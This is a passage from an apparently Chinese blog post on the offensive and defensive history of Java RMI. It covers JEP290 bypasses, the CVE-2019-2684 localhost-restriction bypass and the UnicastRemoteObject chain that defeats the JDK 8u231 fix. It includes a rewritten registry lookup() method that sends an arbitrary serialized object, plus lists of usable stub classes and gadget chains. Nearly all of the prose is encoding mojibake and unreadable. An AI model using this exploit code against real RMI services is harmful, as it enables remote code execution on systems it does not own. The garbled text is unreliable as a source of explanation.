src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/19.png"></p><p>ç»¼ä¸Šçœ‹æ¥ï¼ŒRemoteObjectå…¶å®æ›´ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼šå±æ€§refå¯åŒ…è£¹UnicastRefå¯¹è±¡ï¼Œå…¶æœ¬èº«åˆå®ç°äº†Remoteæ¥å£ã€‚é‚£ä»–çš„å­ç±»ç†è®ºä¸Šæ¥è¯´å‡æ˜¯å¯ä»¥æ»¡è¶³è¦æ±‚çš„ã€‚</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/20.png"></p><p>ä½†æ˜¯äº‹å®å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è±¡çš„é‚£æ ·ï¼Œè°ƒè¯•å‘ç°åœ¨æ“ä½œåºåˆ—åŒ–å†™å…¥æ•°æ®æ—¶ï¼Œä¼šè¿›è¡Œåˆ¤æ–­(enableReplaceå€¼é»˜è®¤ä¸ºtrue)ï¼Œå¦‚æœæ»¡è¶³â€ç›®æ ‡ç±»å®ç°Remoteæ¥å£ &amp;&amp; æœªå®ç°RemoteStubæ¥å£ &amp;&amp;  â€œåˆ™ä¼šå°†æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»æ›¿æ¢ã€‚ä»è€Œå¯¼è‡´æ”»å‡»åˆ©ç”¨å¤±è´¥ã€‚å¦‚ä¸‹æ˜¯è°ƒç”¨è¿‡ç¨‹æ›¿æ¢æ–¹æ³•replaceObject()çš„é€»è¾‘ä»£ç </p><p>java.io.ObjectOutputStream#writeObject0</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/21.png"></p><p>sun.rmi.server.MarshalOutputStream#replaceObject</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/22.png"></p><p>è€ŒRemoteStubæ˜¯RemoteObjectçš„å­ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾çš„ç›®æ ‡ç±»åªéœ€è¦ç¼©å°èŒƒå›´ï¼Œåªæ‰¾RemoteStubå­ç±»å³å¯æ»¡è¶³è¦æ±‚ã€‚</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/23.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">RMIConnectionImpl_Stubã€RMIServerImpl_Stubã€ActivationGroup_Stubã€DGCImpl_Stubã€Activation<span class="hljs-symbol">$Activatio</span>nSystemImpl_Stubã€ReferenceWrapper_Stubã€RegistryImpl_Stub<br></code></pre></td></tr></table></figure><p>ç»æµ‹è¯•ï¼Œè¿™äº›ç±»ç›´æ¥åŒ…è£¹unicastRefå¯¹è±¡å°±å¯ä»¥å®Œæˆåˆ©ç”¨</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/24.png"></p><p>å¦å¤–ä¹Ÿå¯ä»¥åˆ©ç”¨åå°„ä¿®æ”¹enableReplaceå€¼ï¼Œåˆ™RemoteObjectçš„å­ç±»å‡å¯ç”¨äº†</p><h3 id="3ã€jdk-x3D-8u141"><a href="#3ã€jdk-x3D-8u141" class="headerlink" title="3ã€jdk &#x3D; 8u141"></a>3ã€jdk &#x3D; 8u141</h3><h4 id="3-1-é™åˆ¶1ï¼šRMI-bind-x2F-rebind-x2F-unbind-æ“ä½œé™åˆ¶æ¥æºåœ°å€ä¸ºæœ¬åœ°"><a href="#3-1-é™åˆ¶1ï¼šRMI-bind-x2F-rebind-x2F-unbind-æ“ä½œé™åˆ¶æ¥æºåœ°å€ä¸ºæœ¬åœ°" class="headerlink" title="3.1 é™åˆ¶1ï¼šRMI bind&#x2F;rebind&#x2F;unbind æ“ä½œé™åˆ¶æ¥æºåœ°å€ä¸ºæœ¬åœ°"></a>3.1 é™åˆ¶1ï¼šRMI bind&#x2F;rebind&#x2F;unbind æ“ä½œé™åˆ¶æ¥æºåœ°å€ä¸ºæœ¬åœ°</h4><blockquote><p>å…¶å®åœ¨jdkçš„æ—©æœŸç‰ˆæœ¬ä¸­bind&#x2F;unbind&#x2F;rebindæ“ä½œéƒ½ä¼šé™åˆ¶åœ°å€ï¼Œåªä¸è¿‡æ ¡éªŒæ˜¯åœ¨ååºåˆ—åŒ–ä¹‹åè¿›è¡Œçš„ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¿›è¡Œæ¼æ´åˆ©ç”¨äº§ç”Ÿå½±å“ã€‚ä½†æ˜¯åœ¨8u141çš„æ›´æ–°ä¸­é™åˆ¶äº†RMI bind&#x2F;rebind&#x2F;unbind æ“ä½œé™åˆ¶æ¥æºåœ°å€ä¸ºæœ¬åœ°åœ°å€ã€‚å¦‚ä¸‹å›¾æ˜¯jdk8u121çš„sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl_Skel.java#dispatch()ä»£ç ï¼šååºåˆ—åŒ–æ“ä½œå®Œæˆä¹‹åæ‰è¿›è¡Œsun.rmi.registry.RegistryImpl#checkAccessåœ°å€æ£€æµ‹</p></blockquote><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/25.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/26.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/27.png"></p><p>oracleå®˜æ–¹åœ¨8u141å¯¹æ­¤å¤„åšäº†ä¿®æ”¹ï¼Œé˜²æ­¢å¤–éƒ¨æ”»å‡»è€…çš„æ¶æ„å¯¹æ³¨å†Œè¡¨è¿›è¡Œbind&#x2F;unbindæ“ä½œã€‚ä¸‹é¢æ˜¯jdk8u121ä¸8u141çš„å¯¹æ¯”ï¼Œå¯ä»¥å‘ç°å°†checkAccessæ“ä½œæå‰è‡³ååºåˆ—åŒ–ä¹‹å‰ã€‚</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/28.png"></p><p>è¿™å°±å½±å“äº†ysoserial.exploit.RMIRegistryExploitçš„ä½¿ç”¨ï¼Œæ­¤expæ­£æ˜¯é€šè¿‡bindæ¶æ„ç±»åˆ°æ³¨å†Œä¸­å¿ƒå®Œæˆæ”»å‡»çš„ã€‚é‚£æœ‰æ²¡æœ‰å…¶ä»–æ“ä½œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆæ¶æ„åºåˆ—æ•°æ®çš„ä¼ é€’å‘¢ã€‚è§‚å¯ŸåŒæ–‡ä»¶ä¸‹çš„å…¶ä»–æ“ä½œï¼Œlookup()ç”¨äºå®¢æˆ·ç«¯å‘æ³¨å†Œç«¯æŸ¥è¯¢ï¼Œç›´æ¥å¯¹æ•°æ®æµè¿›è¡ŒreadObject()æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰checkAccess()åœ°å€æ¥æºæ ¡éªŒã€‚æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/29.png"></p><h4 id="3-2-ç»•è¿‡1ï¼šRMI-lookup-ç»•è¿‡å¯¹æ¥æºåœ°å€çš„é™åˆ¶"><a href="#3-2-ç»•è¿‡1ï¼šRMI-lookup-ç»•è¿‡å¯¹æ¥æºåœ°å€çš„é™åˆ¶" class="headerlink" title="3.2 ç»•è¿‡1ï¼šRMI lookup ç»•è¿‡å¯¹æ¥æºåœ°å€çš„é™åˆ¶"></a>3.2 ç»•è¿‡1ï¼šRMI lookup ç»•è¿‡å¯¹æ¥æºåœ°å€çš„é™åˆ¶</h4><p>æ ¹æ®ä¸Šä¸€å°èŠ‚æè¿°ï¼Œæˆ‘ä»¬å¯ä»¥æ™“å¾—åœ¨8u141åŠä¹‹åï¼Œå³ä½¿ä½¿ç”¨ç™½åå•ä¸­çš„UnicastRefç±»ç»•è¿‡äº†JEP290ï¼Œå®˜æ–¹å¯¹bind&#x2F;unbind&#x2F;rebindæ“ä½œçš„é™åˆ¶æ¥æºä¸ºæœ¬åœ°ï¼Œå¯¼è‡´æ— æ³•å®Œæˆåˆ©ç”¨ã€‚æˆ‘ä»¬çœ‹åˆ°åœ¨åŒæ–‡ä»¶ä¸‹çš„lookupæ–¹æ³•æ»¡è¶³è¦æ±‚ï¼ˆ1ã€æœªæ£€æŸ¥æ¥æºåœ°å€ï¼›2ã€è™½ç„¶ä¼ é€’çš„æ˜¯Stringç±»å‹å‚æ•°ï¼Œä½†æ˜¯åœ¨å†™å…¥ä½¿ç”¨çš„æ˜¯writeObjectæ“ä½œï¼‰ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æ‹¿sun.rmi.registry.RegistryImpl_Stub#lookupæ¥ä½¿ç”¨ï¼Œéœ€è¦è¿›è¡Œç®€å•æ”¹é€ ï¼Œä½¿å…¶æ”¯æŒä¼ å…¥Objectç±»å‹å‚æ•°</p><p>sun.rmi.registry.RegistryImpl_Stub#lookup</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/30.png"></p><p>æˆ‘ä»¬ä»¿ç…§é€»è¾‘é‡å†™ä¸€ä¸ªæ”¯æŒä¼ å…¥Objectç±»å‹å‚æ•°çš„lookupæ–¹æ³•</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> Remote lookup(Registry registry,Object var1) throws Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            RemoteRef ref = (RemoteRef) Reflections.getFieldValue(registry,<span class="hljs-string">&quot;ref&quot;</span>);<br>            Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;java.lang.String list()[]&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;<br>            RemoteCall var2 = ref.<span class="hljs-keyword">new</span><span class="hljs-type">Call</span>((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071</span>L);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                ObjectOutput var3 = var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>            &#125;<br><br>            ref.invoke(var2);<br><br><span class="hljs-comment">//å¤„ç†è¿”å›ä¿¡æ¯çš„ä»£ç é€»è¾‘ä¹Ÿå¯ä»¥åˆ é™¤</span><br>            Remote var23;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ObjectInput var6 = var2.getInputStream();<br>                var23 = (Remote)var6.readObject();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>            &#125; finally &#123;<br>                ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var23;<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>            <span class="hljs-keyword">throw</span> var19;<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>            <span class="hljs-keyword">throw</span> var20;<br>        &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>            <span class="hljs-keyword">throw</span> var21;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/31.png"></p><h4 id="3-3-ç»•è¿‡2ï¼šç»•è¿‡æœ¬åœ°åœ°å€é™åˆ¶ï¼ˆCVE-2019-2684ï¼‰"><a href="#3-3-ç»•è¿‡2ï¼šç»•è¿‡æœ¬åœ°åœ°å€é™åˆ¶ï¼ˆCVE-2019-2684ï¼‰" class="headerlink" title="3.3 ç»•è¿‡2ï¼šç»•è¿‡æœ¬åœ°åœ°å€é™åˆ¶ï¼ˆCVE-2019-2684ï¼‰"></a>3.3 ç»•è¿‡2ï¼šç»•è¿‡æœ¬åœ°åœ°å€é™åˆ¶ï¼ˆCVE-2019-2684ï¼‰</h4><p>åœ¨1.2èŠ‚æˆ‘ä»¬æ¼”ç¤ºäº†æ„é€ DGCå±‚æ•°æ®çš„æ„é€ ã€åœ¨3.2èŠ‚æˆ‘ä»¬é‡å†™äº†lookupæ–¹æ³•ä½¿å…¶å¯ä»¥ä¼ å…¥Objectç±»å‹çš„å‚æ•°ã€‚å¯¹äºæ­¤ç±»RPCçš„è°ƒç”¨ï¼Œæ•°æ®å…¨éƒ¨ç”±å®¢æˆ·ç«¯æ„é€ ï¼Œæ”»å‡»è€…å¯ä»¥ä»»æ„æ›´æ”¹ä¼ è¾“æ•°æ®å»åº”å¯¹æœåŠ¡ç«¯çš„è¿‡æ»¤å¤„ç†é€»è¾‘ã€‚è€Œå›åˆ°æˆ‘ä»¬è¿™é‡Œè®¨è®ºçš„JDK8u141åŠ ä¸Šlocalhosté™åˆ¶ï¼Œæˆ‘ä»¬ç±»æ¯”DGCå±‚æ•°æ®æ„é€ ã€æ”¹é€ lookupæ–¹æ³•çš„æ“ä½œï¼Œå¯ä»¥åŠ¨æ‰‹æ”¹é€ bindæ–¹æ³•å»è§£å†³ã€‚å…³äºè¯¥ç»•è¿‡ï¼Œè²Œä¼¼å…³æ³¨çš„äººæå°‘ã€‚ä¸”Ysoserialä¹Ÿæœªå¯¹æ­¤é™åˆ¶ç»•è¿‡ç¼–å†™EXPï¼Œæ‰€ä»¥è¿™é‡ŒåŠ¨æ‰‹å†™ä¸€ä¸‹ã€‚å…·ä½“æ€è·¯ç”±å¦‚ä¸‹ä¸¤ç§ï¼š</p><p>1ã€é‡å†™bindé€»è¾‘ï¼Œä½¿å¾—åœ¨åˆ¤æ–­æ—¶è¿›å…¥lookupçš„å¤„ç†é€»è¾‘è¿›è€Œè§¦å‘UnicastRefååºåˆ—åŒ–é“¾ã€‚</p><p>2ã€é‡å†™bindé€»è¾‘ï¼Œä½¿æœåŠ¡ç«¯è¿›å…¥â€œè°ƒç”¨è‡ªå®šä¹‰æ–¹æ³•â€œçš„é€»è¾‘ï¼Œè€Œè‡ªå®šä¹‰æ–¹æ³•çš„å‚æ•°æ˜¯åºåˆ—åŒ–å‚æ•°ï¼Œå¹¶æœªè¿›å…¥oldDispatchï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡localhostçš„åˆ¤æ–­</p><p>æ€è·¯1å…¶å®æœ¬è´¨æ¥è¯´ä¸3.2çš„ç»•è¿‡1æ˜¯ç›¸åŒçš„ï¼Œå‡åˆ©ç”¨äº†æœªåšé‰´æƒçš„lookupæ–¹æ³•</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/32.png"></p><p>ç»•è¿‡çš„exp 1ï¼š</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/33.png"></p><p>æˆ‘ä»¬çœ‹ä¸‹æ€è·¯2ï¼š</p><p>å½“opnum&lt;0æ—¶è¡¨æ˜æ˜¯ç”¨æˆ·è‡ªå®šä¹‰æ–¹æ³•ï¼ŒæœåŠ¡ç«¯æ ¹æ®<code>hashToMethod_Map.get(æ–¹æ³•hashå€¼)</code>ç¡®è®¤ç›®æ ‡æ–¹æ³•ã€‚ä½†æ˜¯å…¶å†…ç½®äº†Registryçš„5ä¸ªæ“ä½œæ–¹æ³•ï¼Œæˆ‘ä»¬åªéœ€è¦ä¼ å…¥å¯¹åº”æ–¹æ³•çš„hashå€¼å³å¯ã€‚</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/34.png"></p><p>æœ€ç»ˆä½¿ç”¨sun.rmi.server.UnicastRef#unmarshalValueç»„è£…â€è‡ªå®šä¹‰æ–¹æ³•å‚æ•°â€æ—¶è°ƒç”¨readObjectè®¾ç½®JRMPåå‘è¿æ¥ã€releaseInputStream()é‡Šæ”¾æ•°æ®æµæ—¶è¯·æ±‚æ¶æ„æœåŠ¡è§¦å‘äºŒæ¬¡ååºåˆ—åŒ–</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/35.png"></p><p>æœ€ç»ˆé€šè¿‡é‡å†™lookupã€bindçš„æ–¹å¼å®Œæˆäº†æœ¬åœ°åœ°å€é™åˆ¶çš„ç»•è¿‡</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/36.png"></p><h3 id="4ã€jdk-x3D-8u231"><a href="#4ã€jdk-x3D-8u231" class="headerlink" title="4ã€jdk &#x3D; 8u231"></a>4ã€jdk &#x3D; 8u231</h3><h4 id="4-1-é™åˆ¶1ï¼šRMI-ä¿®å¤UnicastRefé“¾ç»•è¿‡çš„é—®é¢˜"><a href="#4-1-é™åˆ¶1ï¼šRMI-ä¿®å¤UnicastRefé“¾ç»•è¿‡çš„é—®é¢˜" class="headerlink" title="4.1 é™åˆ¶1ï¼šRMI ä¿®å¤UnicastRefé“¾ç»•è¿‡çš„é—®é¢˜"></a>4.1 é™åˆ¶1ï¼šRMI ä¿®å¤UnicastRefé“¾ç»•è¿‡çš„é—®é¢˜</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//ä¿®å¤1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//ä¿®å¤2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h5 id="4-1-1-æ¸…é™¤UnicastRefçš„åè¿åœ°å€"><a href="#4-1-1-æ¸…é™¤UnicastRefçš„åè¿åœ°å€" class="headerlink" title="4.1.1 æ¸…é™¤UnicastRefçš„åè¿åœ°å€"></a>4.1.1 æ¸…é™¤UnicastRefçš„åè¿åœ°å€</h5><p>åœ¨JDK8U231ç‰ˆæœ¬åœ¨sun.rmi.registry.RegistryImpl_Skel#dispatchå¤„ç†bindã€lookupã€rebindã€unbindæ“ä½œæ—¶å¢åŠ äº†sun.rmi.transport.StreamRemoteCall#discardPendingRefsæ–¹æ³•ï¼Œå½“ååºåˆ—åŒ–æ—¶å‘ç”ŸIO&#x2F;ç±»æ‰¾ä¸åˆ°æˆ–ç±»å‹è½¬æ¢é”™è¯¯æ—¶ï¼Œä¼šè°ƒç”¨sun.rmi.transport.ConnectionInputStream#discardRefsæ–¹æ³•ï¼Œå»æ‰UnicastRefçš„åè¿åœ°å€(ä¹‹å‰å­˜å‚¨åœ°å€æ—¶ä½¿ç”¨çš„æ˜¯ConnectionInputStream#saveRef)ï¼Œå¯¼è‡´UnicastRef JRMPå¤–è¿é“¾æ— æ³•åˆ©ç”¨</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/37.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/38.png"></p><p>å½“æœåŠ¡ç«¯å¤„ç†â€œç”±å®¢æˆ·ç«¯æ”¹é€ çš„lookup()ä¼ è¾“çš„UnicastRefæ¶æ„æ•°æ®â€æ—¶ï¼ŒreadObjectä¼šæ­£å¸¸æ‰§è¡Œï¼Œä½†æ˜¯å½“è½¬ä¸ºStringç±»å‹æ—¶è§¦å‘catch ClassCastExceptioné”™è¯¯ï¼Œè¿›å…¥discardPendingRefsè¿›è¡Œæ¸…é™¤æ•°æ®ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°incomingRefTableåœ¨å¤„ç†å‰åçš„å¯¹æ¯”</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/39.png"></p><p>æ‰§è¡ŒdiscardPendingRefsæ“ä½œå</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/40.png"></p><h5 id="4-1-2-å¯¹åè¿æ‹¿åˆ°çš„å¯¹è±¡è¿›è¡Œç™½åå•æ ¡éªŒ"><a href="#4-1-2-å¯¹åè¿æ‹¿åˆ°çš„å¯¹è±¡è¿›è¡Œç™½åå•æ ¡éªŒ" class="headerlink" title="4.1.2 å¯¹åè¿æ‹¿åˆ°çš„å¯¹è±¡è¿›è¡Œç™½åå•æ ¡éªŒ"></a>4.1.2 å¯¹åè¿æ‹¿åˆ°çš„å¯¹è±¡è¿›è¡Œç™½åå•æ ¡éªŒ</h5><p>å¦å¤–Registryåœ¨å¤„ç†JRMPåè¿æ“ä½œæ—¶ä¼šæœ€ç»ˆä¼šè°ƒç”¨åˆ°sun.rmi.transport.DGCImpl_Stub#dirtyæ–¹æ³•ï¼Œå¹¶åœ¨this.ref.invoke(var5);æ“ä½œä¸­è§¦å‘ååºåˆ—åŒ–æ“ä½œï¼Œ8u231åœ¨invokeå‰å¢åŠ äº†ç™½åå•é™åˆ¶sun.rmi.transport.DGCImpl_Stub#leaseFilterå¯¼è‡´</p><p>è¿”å›çš„åºåˆ—åŒ–å¯¹è±¡æ— æ³•é€šè¿‡æ£€æµ‹</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/41.png"></p><p>leaseFilterç™½åå•ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UID<span class="hljs-selector-class">.class</span><br>VMID<span class="hljs-selector-class">.class</span><br>Lease<span class="hljs-selector-class">.class</span><br>Throwable<br><span class="hljs-string">&quot;java.lang.*&quot;</span><br><span class="hljs-string">&quot;java.rmi.*&quot;</span><br>StackTraceElement<span class="hljs-selector-class">.class</span><br>ArrayList<span class="hljs-selector-class">.class</span><br>Object<span class="hljs-selector-class">.class</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableList</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableCollection</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableRandomAccessList</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$EmptyList</span><br></code></pre></td></tr></table></figure><h4 id="4-2-ç»•è¿‡1ï¼šä½¿ç”¨UnicastRemoteObjecté“¾ç»•è¿‡ä¿®å¤"><a href="#4-2-ç»•è¿‡1ï¼šä½¿ç”¨UnicastRemoteObjecté“¾ç»•è¿‡ä¿®å¤" class="headerlink" title="4.2 ç»•è¿‡1ï¼šä½¿ç”¨UnicastRemoteObjecté“¾ç»•è¿‡ä¿®å¤"></a>4.2 ç»•è¿‡1ï¼šä½¿ç”¨UnicastRemoteObjecté“¾ç»•è¿‡ä¿®å¤</h4><p><strong>è¿™æ¡é“¾ä¸ ä¹‹å‰ç»•è¿‡JEP290çš„UnicastRef é“¾ä¸åŒä¹‹å¤„åœ¨ä¸å®ƒå¹¶ä¸æ˜¯åœ¨ StreamRemoteCall#releaseInputStreamä¸­è§¦å‘JRMPå¤–è¿ï¼Œè€Œæ˜¯åœ¨è°ƒç”¨readObjectçš„æ—¶å€™å°±è§¦å‘äº†ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡8u231çš„ä¿®å¤è¡¥ä¸</strong>ã€‚è¿™æ¡é“¾æ˜¯ç”±An Trinh å‘ç°å¹¶åœ¨19å¹´Blackhatä¸Šå…¬å¸ƒçš„ï¼Œè¯¦æƒ…å¯å‚è€ƒï¼š<a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a></p><p>ç›¸å½“äºä»UnicastRemoteObject.readObject()é€šè¿‡â€ä¸€ç³»åˆ—æ“ä½œâ€œ æœ€ç»ˆè°ƒç”¨åˆ°äº†UnicastRef.invoke()ï¼Œåˆšå¥½ç»•è¿‡å®˜æ–¹çš„ä¸¤æ­¥ä¿®å¤æ–¹æ¡ˆã€‚UnicastRefé“¾åŠ8u231çš„ä¿®å¤æ–¹æ¡ˆ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRef gadget chainï¼š<br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//ä¿®å¤1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//ä¿®å¤2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span 